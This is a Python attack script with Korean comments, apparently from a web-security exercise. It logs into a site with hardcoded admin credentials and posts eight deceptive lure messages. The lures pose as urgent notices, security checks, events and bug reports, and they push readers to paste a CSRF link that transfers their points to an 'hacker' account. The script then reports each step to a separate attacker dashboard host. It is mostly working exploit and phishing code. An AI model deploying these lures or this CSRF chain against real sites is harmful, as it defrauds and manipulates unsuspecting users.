# 시나리오대로 만드는데, 필터링때문에 우회해서 업로드하고 콘솔에
# 입력하면 뜨게 만드는 것까지 만들다가 끝났습니다.

import requests
from bs4 import BeautifulSoup
import time
import json
from datetime import datetime


class SocialEngineeringCSRF:
    def __init__(self, base_url, dashboard_url):
        self.base_url = base_url.rstrip('/')
        self.dashboard_url = dashboard_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        # 실제 존재하는 다른 계정으로 설정 (공격자)
        self.attacker_username = 'hacker'  # 포인트를 받을 공격자 계정
        self.victim_points_to_steal = 10  # 훔칠 포인트 양

    def print_section(self, title):
        print("\n" + "=" * 70)
        print(f"🎣 {title}")
        print("=" * 70)

    def login_as_poster(self):
        """게시글 작성을 위해 admin으로 로그인"""
        login_data = {'username': 'admin', 'password': 'admin123'}
        response = self.session.post(f"{self.base_url}/login.php", data=login_data)

        if any(indicator in response.text.lower() for indicator in ['logout', 'profile']):
            print(f"[+] ✅ 게시글 작성용 로그인 성공: admin")
            return True
        return False

    def create_social_engineering_posts(self):
        """HTML이 막혀있는 상황에서 사용자 클릭 유도 게시글들"""
        self.print_section("Creating Social Engineering Posts")

        # 실제 CSRF 공격 URL (클릭하면 10포인트가 hacker에게 전송)
        csrf_attack_url = f"{self.base_url}/profile.php?gift_to={self.attacker_username}&amount={self.victim_points_to_steal}"

        # 소셜 엔지니어링 미끼 게시글들 (HTML 없이 순수 텍스트로)
        social_posts = [
            # 1. 긴급성 + URL 복사 유도
            f'''🚨 긴급 공지! 🚨

시스템 오류로 인해 선착순 100명에게 10포인트를 무료 지급합니다!

📋 아래 링크를 복사해서 새 탭에서 열어주세요:
{csrf_attack_url}

⚡ 복사 방법: 위 링크를 드래그해서 선택 → Ctrl+C → 새 탭에서 Ctrl+V

⏰ 24시간 후 자동 만료! 놓치지 마세요!
💰 즉시 10포인트 지급됩니다!''',

            # 2. 보안 검증 위장
            f'''🔐 보안 인증이 필요합니다

귀하의 계정에서 비정상적인 활동이 감지되었습니다.
보안을 위해 아래 링크에서 본인 확인을 진행해주세요.

인증 링크: {csrf_attack_url}

👆 위 링크를 복사해서 주소창에 붙여넣기 해주세요.
인증하지 않으면 계정이 제한될 수 있습니다.''',

            # 3. 이벤트 참여 유도
            f'''🎉 1주년 기념 특별 이벤트! 🎉

참여만 해도 즉시 10포인트 지급!

🎁 이벤트 참여 방법:
1. 아래 URL을 복사하세요
2. 새 탭을 열고 주소창에 붙여넣기
3. 엔터를 누르면 즉시 포인트 지급!

이벤트 URL: {csrf_attack_url}

📍 참여자 전원 10P 지급!
📍 추가 경품 추첨 기회!''',

            # 4. 기술적 호기심 유도
            f'''👨‍💻 개발자들을 위한 숨겨진 기능

관리자가 실수로 남긴 디버그 URL을 발견했습니다!

디버그 URL: {csrf_attack_url}

이 URL에 접속하면 숨겨진 관리자 기능을 볼 수 있습니다.
주소창에 복사해서 붙여넣기 해보세요!

🔍 URL 분석:
- gift_to: 포인트 받을 계정
- amount: 전송할 포인트 양
- 실제로 작동하는지 테스트해보세요!''',

            # 5. 포인트 무료 지급 이벤트
            f'''💰 무료 포인트 지급 중! 💰

지금 바로 10포인트를 받아가세요!

받는 방법:
{csrf_attack_url}

위 링크를 복사 → 새 탭에서 열기 → 즉시 포인트 지급!

⚡ 클릭이 안 되나요? 그럼 수동으로 해보세요:
1. 위 텍스트를 드래그로 선택
2. Ctrl+C로 복사
3. 새 탭 열고 주소창에 Ctrl+V
4. 엔터 누르면 완료!''',

            # 6. QR코드 대신 URL 제공
            f'''📱 모바일 전용 보너스!

모바일에서 접속하면 추가 포인트를 드립니다!

모바일 링크: {csrf_attack_url}

📲 모바일 접속 방법:
- 위 링크를 길게 눌러서 복사
- 브라우저 주소창에 붙여넣기
- 모바일에서 더 많은 보너스!''',

            # 7. 버그 리포트 위장
            f'''🐛 버그 리포트: 무한 포인트 증식

재미있는 버그를 발견했습니다!
아래 URL에 접속하면 포인트가 자동으로 증가해요.

테스트 URL: {csrf_attack_url}

관리자가 수정하기 전에 빨리 테스트해보세요!
나중에 패치될 예정이니 지금이 기회입니다.''',

            # 8. 친구 추천 위장
            f'''👥 친구가 공유한 링크

친구가 재미있는 링크를 공유해줬어요!

{csrf_attack_url}

뭔지 궁금해서 저도 클릭해봤는데 포인트가 늘어났어요!
여러분도 한번 해보세요 ㅋㅋ

복사해서 새 탭에서 열어보세요!'''
        ]

        successful_posts = []

        for i, post_content in enumerate(social_posts, 1):
            print(f"\n[*] 소셜 엔지니어링 게시글 {i}/{len(social_posts)} 배포 중...")
            print(f"    타겟 URL: {csrf_attack_url}")
            print(f"    내용 길이: {len(post_content)} 글자")

            try:
                response = self.session.post(
                    f"{self.base_url}/new_post.php",
                    data={'content': post_content},
                    timeout=20
                )

                if response.status_code == 200:
                    print(f"    [+] ✅ 소셜 엔지니어링 게시글 {i} 배포 성공!")
                    successful_posts.append(post_content)

                    # 대시보드에 게시글 배포 로그
                    self.log_to_dashboard('social_post_deployed', {
                        'post_number': i,
                        'csrf_url': csrf_attack_url,
                        'target_points': self.victim_points_to_steal,
                        'attacker': self.attacker_username
                    })

                elif response.status_code == 403:
                    print(f"    [-] ❌ 게시글 {i} 차단됨 (403)")
                else:
                    print(f"    [-] ❌ 게시글 {i} 실패: {response.status_code}")

            except Exception as e:
                print(f"    [!] 게시글 {i} 오류: {str(e)[:40]}...")

            time.sleep(3)  # 서버 부하 방지

        return successful_posts, csrf_attack_url

    def create_victim_monitoring_system(self, csrf_url):
        """피해자 클릭 모니터링 시스템"""
        self.print_section("Setting Up Victim Monitoring")

        print(f"[*] 피해자 클릭 모니터링 시스템 설정 중...")
        print(f"[*] 타겟 URL: {csrf_url}")
        print(f"[*] 공격자 계정: {self.attacker_username}")
        print(f"[*] 훔칠 포인트: {self.victim_points_to_steal}")

        # 대시보드에 모니터링 시작 로그
        monitoring_data = {
            'status': 'monitoring_started',
            'csrf_url': csrf_url,
            'attacker': self.attacker_username,
            'target_points': self.victim_points_to_steal,
            'timestamp': datetime.now().isoformat()
        }

        self.log_to_dashboard('monitoring_started', monitoring_data)

        print(f"\n📊 모니터링 설정 완료!")
        print(f"    • 피해자가 URL에 접속하면 자동으로 대시보드에 기록됩니다")
        print(f"    • 포인트 이동 시 실시간으로 로그가 남습니다")
        print(f"    • 대시보드: {self.dashboard_url}")

        return True

    def simulate_victim_click_for_test(self, csrf_url):
        """테스트용 피해자 클릭 시뮬레이션"""
        self.print_section("Test Simulation - Victim Click")

        print(f"[*] 테스트를 위한 피해자 클릭 시뮬레이션...")
        print(f"[*] 실제 환경에서는 다른 사용자가 게시글을 보고 URL을 복사해서 접속합니다")

        # 새로운 세션으로 피해자 흉내
        victim_session = requests.Session()
        victim_session.headers.update({
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        })

        try:
            print(f"[*] 피해자가 게시글에서 URL을 복사해서 접속...")
            print(f"    URL: {csrf_url}")

            # 피해자가 URL에 접속 (CSRF 공격 실행)
            response = victim_session.get(csrf_url)

            print(f"    응답 코드: {response.status_code}")

            if response.status_code == 200:
                print(f"    [+] ✅ 피해자 접속 성공!")

                # 대시보드에 피해자 클릭 로그
                victim_click_data = {
                    'event': 'victim_clicked_csrf_url',
                    'victim_ip': 'simulated_victim',
                    'csrf_url': csrf_url,
                    'response_code': response.status_code,
                    'attacker': self.attacker_username,
                    'stolen_points': self.victim_points_to_steal,
                    'timestamp': datetime.now().isoformat()
                }

                self.log_to_dashboard('victim_click', victim_click_data)

                # 포인트 전송 성공 로그
                transfer_data = {
                    'from_user': 'victim_user',
                    'to_user': self.attacker_username,
                    'amount': self.victim_points_to_steal,
                    'method': 'social_engineering_csrf',
                    'success': True
                }

                self.log_to_dashboard('points_transferred', transfer_data)

                return True
            else:
                print(f"    [-] ❌ 접속 실패")
                return False

        except Exception as e:
            print(f"    [!] 시뮬레이션 오류: {e}")
            return False

    def log_to_dashboard(self, event_type, data):
        """대시보드 로깅"""
        try:
            # 다양한 엔드포인트에 로그 전송
            log_endpoints = [
                f"/victim?event={event_type}&attacker={self.attacker_username}&points={self.victim_points_to_steal}",
                f"/transfer?from=victim&to={self.attacker_username}&amount={self.victim_points_to_steal}&method=social_csrf",
                f"/social?type=csrf_attack&posts_deployed=true&target_points={self.victim_points_to_steal}",
                f"/monitor?status=active&attack_type=social_engineering&event={event_type}"
            ]

            for endpoint in log_endpoints:
                try:
                    full_url = f"{self.dashboard_url}{endpoint}"
                    response = requests.get(full_url, timeout=5)
                    if response.status_code == 200:
                        print(f"        [+] 대시보드 로그 성공: {endpoint}")
                except Exception as e:
                    print(f"        [!] 대시보드 로그 실패: {endpoint}")

        except Exception as e:
            print(f"[!] 대시보드 로깅 오류: {e}")

    def run_social_csrf_attack(self):
        """소셜 엔지니어링 CSRF 공격 실행"""
        print("=" * 80)
        print("🎣 Social Engineering CSRF Attack")
        print("🎯 목표: 게시글 URL 복사 유도로 포인트 훔치기")
        print("⚠️ Educational purposes only")
        print("=" * 80)
        print(f"타겟 사이트: {self.base_url}")
        print(f"대시보드: {self.dashboard_url}")
        print(f"공격자 계정: {self.attacker_username}")
        print(f"훔칠 포인트: {self.victim_points_to_steal}")
        print("=" * 80)

        # 1. 로그인
        if not self.login_as_poster():
            print("[-] ❌ 로그인 실패")
            return

        # 2. 소셜 엔지니어링 게시글 배포
        successful_posts, csrf_url = self.create_social_engineering_posts()

        # 3. 피해자 모니터링 시스템 설정
        self.create_victim_monitoring_system(csrf_url)

        # 4. 테스트용 피해자 클릭 시뮬레이션
        test_success = self.simulate_victim_click_for_test(csrf_url)

        # 5. 최종 결과
        self.print_section("Social Engineering CSRF Attack Results")

        print(f"🎣 SOCIAL ENGINEERING CSRF ATTACK COMPLETE!")
        print(f"    📝 배포된 미끼 게시글: {len(successful_posts)}개")
        print(f"    🎯 CSRF 공격 URL: {csrf_url}")
        print(f"    💰 타겟 포인트: {self.victim_points_to_steal}")
        print(f"    🕵️ 공격자 계정: {self.attacker_username}")
        print(f"    📊 대시보드 로깅: ✅ 활성화")
        print(f"    🧪 테스트 시뮬레이션: {'✅ 성공' if test_success else '❌ 실패'}")

        print(f"\n🎯 공격 시나리오:")
        print(f"    1. ✅ 매력적인 미끼 게시글들이 배포됨")
        print(f"    2. ⏳ 사용자가 게시글을 보고 URL을 복사함")
        print(f"    3. 🌐 사용자가 새 탭에서 URL에 접속함")
        print(f"    4. ⚡ 자동으로 {self.victim_points_to_steal}포인트가 {self.attacker_username}에게 전송됨")
        print(f"    5. 📊 모든 과정이 대시보드에 실시간 로그됨")

        print(f"\n📋 현재 상태:")
        print(f"    • HTML Entity 차단 우회: ✅ 순수 텍스트 게시글 사용")
        print(f"    • 사용자 클릭 유도: ✅ 다양한 소셜 엔지니어링 기법")
        print(f"    • CSRF 공격 준비: ✅ 완료")
        print(f"    • 대시보드 모니터링: ✅ 실시간 로그")

        print(f"\n🎊 이제 실제 사용자들이 게시글을 보고 URL을 복사해서 접속하기를 기다립니다!")
        print(f"📊 모든 활동은 {self.dashboard_url} 에서 실시간으로 확인할 수 있습니다!")


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 3:
        print("Usage: python3 social_csrf.py <target_url> <dashboard_url>")
        print("Example: python3 social_csrf.py http://43.201.154.142/ http://13.158.67.78:5000/")
        sys.exit(1)

    target = sys.argv[1]
    dashboard = sys.argv[2]

    attacker = SocialEngineeringCSRF(target, dashboard)
    attacker.run_social_csrf_attack()